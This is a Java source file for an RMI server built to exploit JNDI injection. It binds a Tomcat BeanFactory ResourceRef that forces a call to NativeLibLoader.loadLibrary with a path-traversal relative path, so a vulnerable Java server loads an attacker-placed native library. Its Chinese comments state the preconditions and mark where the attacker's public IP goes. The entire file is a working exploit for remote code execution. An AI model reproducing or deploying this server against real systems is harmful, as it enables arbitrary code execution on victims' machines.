package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
/*
 com.sun.glass.utils.NativeLibLoader,JDK内置的动态链接库加载工具类
 可以被JNDI注入利用加载恶意dll来执行任意代码
 需要的条件:
    1.存在JNDI注入
    2.被攻击服务器存在可以被利用的.dll或者.so文件在攻击者可控制的路径下

 */

public class NativeLibLoaderServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1100);
        //攻击主机的公网ip
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        //不能使用绝对路径,相对路径根据不同的环境修改
        ref.add(new StringRefAddr("a", "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\libcmd"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("dllLoader", referenceWrapper);
        System.out.println("RMI Server start on 1100");
    }
}
